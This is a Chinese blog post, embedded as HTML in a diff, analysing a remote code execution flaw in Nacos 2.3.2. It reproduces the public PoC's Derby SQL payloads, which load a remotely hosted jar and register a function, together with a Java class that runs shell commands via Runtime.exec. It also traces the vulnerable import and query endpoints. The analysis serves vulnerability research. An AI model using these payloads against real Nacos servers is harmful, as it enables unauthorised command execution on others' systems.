@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="首先下载pochttps:&#x2F;&#x2F;github.com&#x2F;ayoundzw&#x2F;nacos-poc 服务https:&#x2F;&#x2F;github.com&#x2F;alibaba&#x2F;nacos&#x2F;releases&#x2F;tag&#x2F;2.3.2 开启调试修改 1set &quot;NACOS_OPTS&#x3D;%NACOS_OPTS%  -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,address&#x3D;9000,server&#x3D;y,s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nacos-0day分析">
+<meta property="og:url" content="http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="n1ght的个人主页">
+<meta property="og:description" content="首先下载pochttps:&#x2F;&#x2F;github.com&#x2F;ayoundzw&#x2F;nacos-poc 服务https:&#x2F;&#x2F;github.com&#x2F;alibaba&#x2F;nacos&#x2F;releases&#x2F;tag&#x2F;2.3.2 开启调试修改 1set &quot;NACOS_OPTS&#x3D;%NACOS_OPTS%  -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,address&#x3D;9000,server&#x3D;y,s">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716001235.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716002625.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716003646.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716003808.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716003909.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716004312.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716004406.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716004545.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716004744.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716004655.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716005045.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716005356.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716005629.png">
+<meta property="article:published_time" content="2024-08-20T10:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-21T09:26:03.327Z">
+<meta property="article:author" content="N1ght">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="cve">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716001235.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>nacos-0day分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/yezere/yezere.github.io">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/11/09/SHCTF-ezjava/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/07/12/2024ciscn-ezjava/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&text=nacos-0day分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&title=nacos-0day分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&is_video=false&description=nacos-0day分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=nacos-0day分析&body=Check out this article: http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&title=nacos-0day分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&title=nacos-0day分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&title=nacos-0day分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&title=nacos-0day分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&name=nacos-0day分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&t=nacos-0day分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.</span> <span class="toc-text">首先下载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">1.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.</span> <span class="toc-text">服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E8%B0%83%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">开启调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">调试</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        nacos-0day分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">N1ght</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-20T10:00:00.000Z" class="dt-published" itemprop="datePublished">2024-08-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/cve/" rel="tag">cve</a>, <a class="p-category" href="/tags/java/" rel="tag">java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="首先下载"><a href="#首先下载" class="headerlink" title="首先下载"></a>首先下载</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p><a target="_blank" rel="noopener" href="https://github.com/ayoundzw/nacos-poc">https://github.com/ayoundzw/nacos-poc</a></p>
+<h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><p><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/releases/tag/2.3.2">https://github.com/alibaba/nacos/releases/tag/2.3.2</a></p>
+<h2 id="开启调试"><a href="#开启调试" class="headerlink" title="开启调试"></a>开启调试</h2><p>修改</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> &quot;NACOS_OPTS=<span class="variable">%NACOS_OPTS%</span>  -agentlib:jdwp=transport=dt_socket,address=<span class="number">9000</span>,server=y,suspend=n  -jar <span class="variable">%BASE_DIR%</span>\target\<span class="variable">%SERVER%</span>.jar&quot;</span><br></pre></td></tr></table></figure>
+<p>看到poc<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716001235.png"><br>查看sql语句<br>这个option_sql自始至终没有用到过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">post_sql = <span class="string">&quot;&quot;&quot;CALL sqlj.install_jar(&#x27;&#123;service&#125;&#x27;, &#x27;NACOS.&#123;id&#125;&#x27;, 0)\n</span></span><br><span class="line"><span class="string">        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;NACOS.&#123;id&#125;&#x27;)\n</span></span><br><span class="line"><span class="string">        CREATE FUNCTION S_EXAMPLE_&#123;id&#125;( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME &#x27;test.poc.Example.exec&#x27;\n&quot;&quot;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>=<span class="built_in">id</span>,service=service);</span><br><span class="line">        option_sql = <span class="string">&quot;UPDATE ROLES SET ROLE=&#x27;1&#x27; WHERE ROLE=&#x27;1&#x27; AND ROLE=S_EXAMPLE_&#123;id&#125;(&#x27;&#123;cmd&#125;&#x27;)\n&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>=<span class="built_in">id</span>,cmd=command);</span><br><span class="line">        get_sql = <span class="string">&quot;select * from (select count(*) as b, S_EXAMPLE_&#123;id&#125;(&#x27;&#123;cmd&#125;&#x27;) as a from config_info) tmp /*ROWS FETCH NEXT*/&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>=<span class="built_in">id</span>,cmd=command);</span><br></pre></td></tr></table></figure>
+<p>首先</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CALL</span> sqlj.install_jar(<span class="string">&#x27;&#123;service&#125;&#x27;</span>, <span class="string">&#x27;NACOS.&#123;id&#125;&#x27;</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>远程加载一个jar进来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(<span class="string">&#x27;derby.database.classpath&#x27;</span>,<span class="string">&#x27;NACOS.&#123;id&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>将这个类加入到derby.database.classpath</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> S_EXAMPLE_&#123;id&#125;( PARAM <span class="type">VARCHAR</span>(<span class="number">2000</span>)) <span class="keyword">RETURNS</span> <span class="type">VARCHAR</span>(<span class="number">2000</span>) <span class="keyword">PARAMETER</span> STYLE JAVA <span class="keyword">NO</span> <span class="keyword">SQL</span> <span class="keyword">LANGUAGE</span> JAVA <span class="keyword">EXTERNAL</span> NAME <span class="string">&#x27;test.poc.Example.exec&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>创建一个静态方法<br>返回值也要是String<br>poc就是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test.poc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;  </span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">exec</span><span class="params">(String id)</span><span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(id).getInputStream();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).next();  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在idea里面打包一个类<br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716002625.png"><br>将生成的jar包重命名为download，然后python -m http.server 5000即可</p>
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>下载源码<br>搜索<br>&#x2F;nacos&#x2F;v1&#x2F;cs&#x2F;ops&#x2F;data&#x2F;removal<br>在com.alibaba.nacos.config.server.controller.ConfigOpsController#importDerby函数里面，有鉴权</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * // TODO the front page should appear operable The external data source is imported into derby.  </span></span><br><span class="line"><span class="comment"> *  </span></span><br><span class="line"><span class="comment"> * &lt;p&gt;mysqldump --defaults-file=&quot;XXX&quot; --host=0.0.0.0 --protocol=tcp --user=XXX --extended-insert=FALSE \  </span></span><br><span class="line"><span class="comment"> * --complete-insert=TRUE \ --skip-triggers --no-create-info --skip-column-statistics &quot;&#123;SCHEMA&#125;&quot; &quot;&#123;TABLE_NAME&#125;&quot; * * <span class="doctag">@param</span> multipartFile &#123;<span class="doctag">@link</span> MultipartFile&#125;  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> &#123;<span class="doctag">@link</span> DeferredResult&#125;  </span></span><br><span class="line"><span class="comment"> */</span><span class="meta">@PostMapping(value = &quot;/data/removal&quot;)</span>  </span><br><span class="line"><span class="meta">@Secured(action = ActionTypes.WRITE, resource = &quot;nacos/admin&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> DeferredResult&lt;RestResult&lt;String&gt;&gt; <span class="title function_">importDerby</span><span class="params">(<span class="meta">@RequestParam(value = &quot;file&quot;)</span> MultipartFile multipartFile)</span> &#123;  </span><br><span class="line">    DeferredResult&lt;RestResult&lt;String&gt;&gt; response = <span class="keyword">new</span> <span class="title class_">DeferredResult</span>&lt;&gt;();  </span><br><span class="line">    <span class="keyword">if</span> (!DatasourceConfiguration.isEmbeddedStorage()) &#123;  </span><br><span class="line">        response.setResult(RestResultUtils.failed(<span class="string">&quot;Limited to embedded storage mode&quot;</span>));  </span><br><span class="line">        <span class="keyword">return</span> response;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="type">DatabaseOperate</span> <span class="variable">databaseOperate</span> <span class="operator">=</span> ApplicationUtils.getBean(DatabaseOperate.class);  </span><br><span class="line">    WebUtils.onFileUpload(multipartFile, file -&gt; &#123;  </span><br><span class="line">        NotifyCenter.publishEvent(<span class="keyword">new</span> <span class="title class_">DerbyImportEvent</span>(<span class="literal">false</span>));  </span><br><span class="line">        databaseOperate.dataImport(file).whenComplete((result, ex) -&gt; &#123;  </span><br><span class="line">            NotifyCenter.publishEvent(<span class="keyword">new</span> <span class="title class_">DerbyImportEvent</span>(<span class="literal">true</span>));  </span><br><span class="line">            <span class="keyword">if</span> (Objects.nonNull(ex)) &#123;  </span><br><span class="line">                response.setResult(RestResultUtils.failed(ex.getMessage()));  </span><br><span class="line">                <span class="keyword">return</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">            response.setResult(result);  </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;, response);  </span><br><span class="line">    <span class="keyword">return</span> response;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716003646.png"></p>
+<p>发现文件上传，有个临时文件看看内容是什么</p>
+<p><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716003808.png"></p>
+<p>内容是导入恶意jar包的sql代码</p>
+<p><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716003909.png"></p>
+<p>发现在数据导入的时候</p>
+<p><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716004312.png"></p>
+<p>通过一行行设置sql代码进入List集合</p>
+<p><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716004406.png"></p>
+<p>再次进入doDataImport</p>
+<p><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716004545.png"></p>
+<p>进入batchUpdate</p>
+<p><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716004744.png"><br><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716004655.png"></p>
+<p>调用了execute</p>
+<p><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716005045.png"></p>
+<p>调用了BatchUpdateStatementCallback#doInStatement函数<br>最后调用stmt.executeBatch函数执行数据库操作命令</p>
+<p><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716005356.png"></p>
+<p>这样恶意jar就已经加载进入数据库了<br>再次使用select查询数据库就能执行恶意命令，p牛师傅给出过一个链接<br><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/4463">https://github.com/alibaba/nacos/issues/4463</a></p>
+<p><img src="https://raw.githubusercontent.com/yezere/images/master/Pasted%20image%2020240716005629.png"></p>
+<p>存在任意sql执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_sql <span class="operator">=</span> &quot;select * from (select count(*) as b, S_EXAMPLE_&#123;id&#125;(&#x27;&#123;cmd&#125;&#x27;) as a from config_info) tmp /*ROWS FETCH NEXT*/&quot;.format(id<span class="operator">=</span>id,cmd<span class="operator">=</span>command);</span><br></pre></td></tr></table></figure>
+<p>所以即可执行命令<br>现在有鉴权</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(value = &quot;/derby&quot;)</span>  </span><br><span class="line"><span class="meta">@Secured(action = ActionTypes.READ, resource = &quot;nacos/admin&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> RestResult&lt;Object&gt; <span class="title function_">derbyOps</span><span class="params">(<span class="meta">@RequestParam(value = &quot;sql&quot;)</span> String sql)</span> &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">selectSign</span> <span class="operator">=</span> <span class="string">&quot;SELECT&quot;</span>;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">limitSign</span> <span class="operator">=</span> <span class="string">&quot;ROWS FETCH NEXT&quot;</span>;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">limit</span> <span class="operator">=</span> <span class="string">&quot; OFFSET 0 ROWS FETCH NEXT 1000 ROWS ONLY&quot;</span>;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (!DatasourceConfiguration.isEmbeddedStorage()) &#123;  </span><br><span class="line">            <span class="keyword">return</span> RestResultUtils.failed(<span class="string">&quot;The current storage mode is not Derby&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="type">LocalDataSourceServiceImpl</span> <span class="variable">dataSourceService</span> <span class="operator">=</span> (LocalDataSourceServiceImpl) DynamicDataSource  </span><br><span class="line">                .getInstance().getDataSource();  </span><br><span class="line">        <span class="keyword">if</span> (StringUtils.startsWithIgnoreCase(sql, selectSign)) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (!StringUtils.containsIgnoreCase(sql, limitSign)) &#123;  </span><br><span class="line">                sql += limit;  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="type">JdbcTemplate</span> <span class="variable">template</span> <span class="operator">=</span> dataSourceService.getJdbcTemplate();  </span><br><span class="line">            List&lt;Map&lt;String, Object&gt;&gt; result = template.queryForList(sql);  </span><br><span class="line">            <span class="keyword">return</span> RestResultUtils.success(result);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> RestResultUtils.failed(<span class="string">&quot;Only query statements are allowed to be executed&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">        <span class="keyword">return</span> RestResultUtils.failed(e.getMessage());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/yezere/yezere.github.io">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.</span> <span class="toc-text">首先下载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">1.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.</span> <span class="toc-text">服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E8%B0%83%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">开启调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">调试</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&text=nacos-0day分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&title=nacos-0day分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&is_video=false&description=nacos-0day分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=nacos-0day分析&body=Check out this article: http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&title=nacos-0day分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&title=nacos-0day分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&title=nacos-0day分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&title=nacos-0day分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/20/nacos-0day%E5%88%86%E6%9E%90/&name=nacos-0day分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
